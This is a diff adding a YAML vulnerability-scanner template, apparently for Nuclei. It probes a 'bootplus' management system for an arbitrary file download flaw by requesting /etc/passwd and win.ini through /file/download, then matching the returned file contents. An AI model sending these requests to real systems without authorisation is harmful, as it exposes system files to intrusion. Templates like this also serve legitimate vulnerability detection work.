@@ -1,0 +1,30 @@
+id: poc-yaml-bootplus-file-download
+info:
+  name: bootplus管理系统 file/download 任意文件下载漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: 文件读取
+http:
+  - raw:
+      - |
+        GET /file/download?name=/etc/passwd&real=1 HTTP/1.1
+        Host: {{Hostname}}
+      - |
+        GET /file/download?name=C://windows/win.ini&real=1 HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "bit app support"
+          - "fonts"
+          - "extensions"
+        condition: and
+      - type: regex
+        part: body
+        regex:
+          - "root:.*:0:0:"
+      - type: status
+        status:
+          - 200
